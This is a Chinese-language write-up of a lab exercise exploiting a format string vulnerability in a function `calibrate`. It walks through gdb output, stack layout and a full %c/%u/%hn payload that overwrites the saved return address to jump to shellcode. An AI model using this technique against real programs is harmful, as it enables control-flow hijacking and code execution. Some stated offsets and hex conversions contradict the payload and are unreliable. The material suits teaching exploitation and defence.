## Main Idea

在函数`calibrate`中，`buf`作为格式化字符串传入了`printf`中。如果传入的字符串包含占位符，那么将会出发格式化字符串漏洞。我们通过构造特定的格式化字符串来修改返回地址。

首先，我们必须想办法把将`printf`的参数指针移到`buf`的开头；接下来，我们要想办法把SHELLCODE的地址写入`eip`中

## Magic Numbers

根据提示，首先获取SHELLCODE的地址，查看`exploit`可知SHELLCODE被作为命令函参数传递：
```
(gdb) x &argv[1]
0xffffdad8:     0xffffdbf0
```

进入函数`calibrate`中，我们要获取`buf`的起始地址和`calibrate`的返回地址：
```
(gdb) p &buf
$2 = (char **) 0xffffd9b0
```
```
(gdb) i f
Stack level 0, frame at 0xffffd9b0:
 eip = 0x80491eb in calibrate (calibrate.c:7); saved eip = 0x804928f
 called by frame at 0xffffda60
 source language c.
 Arglist at 0xffffd9a8, args: buf=0xffffd9c0 ""
 Locals at 0xffffd9a8, Previous frame's sp is 0xffffd9b0
 Saved registers:
  ebp at 0xffffd9a8, eip at 0xffffd9ac
```

我们还要找到`printf`的参数指针，进入`printf`然后打印出来：
```
(gdb) s
printf (fmt=0xffffd9c0 "AAAA\254\331\377\377AAAA\256\331\377\377%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%56273u%hn%9231u%hn\n") at src/stdio/printf.c:8
8       src/stdio/printf.c: No such file or directory.
```
```
(gdb) p &fmt
$3 = (const char * restrict *) 0xffffd980
```

接下来计算要把`&fmt`移动多远，即`0xffffd9b0 - (0xffffd980 + 4) = 0x4b = 60`。根据提示我们用`%c`来跳过栈上的参数，每输出一个参数，参数指针就会往上走一格。根据上面的结果我们需要15个`%c`，这是因为栈上按字为单位。

完成上一步后，参数指针会指向`buf`了。这时候我们就需要将SHELLCODE地址写入`eip`。这一操作通过`%hn`实现。根据提示，我们把地址`0xffffd9b0`拆分成两部分输入。我们需要分别确定这两部分各需要输出多少字符。

- 第二部分`0xd9b0`需要输出`0xd9b0`个字符，在刚才的移动中，我们已经输出了31个字符，因此还需要输入(SECOND_HALF - 31)个字符。

- 由于第二部分已经输出了`0xd9b0`个字符，因此第一部分`0xffff`还需要输出`0xffff - 0xd9b0`个字符，即(FIRST_HALF - SECOND_HALF)。

## Exploit Structure

```
[       buf         ]               [0xffffd9b0]
[   eip of clibrate ]               [0xffffd9ac]
[   ebp of clibrate ]               [0xffffd9a8]
[       ???         ]               [0x????????]
[        f          ]               [0xffffd99c]
[       ???         ]               [0x????????]  
[       fmt         ]               [0xffffd980]
[   eip of printf   ]               [0xffffd97c]
```

1. 为`%hn`填充参数，注意需要先填充垃圾用来消耗`%__u`。填充的参数即为要写入的目的地址(calibrate eip)。
2. 将参数指针移动到`buf`起始处。
3. 计算要输出的字节数，以便把SHELLCODE的地址写入目的地址(calibrate eip)。

## Exploit GDB Output

进行爆破前：
```
(gdb) x 0xffffd9ac
0xffffd9ac:     0x0804928f
```

进行爆破后：
```
(gdb) x 0xffffd9ac
0xffffd9ac:     0xffffdbf0
```
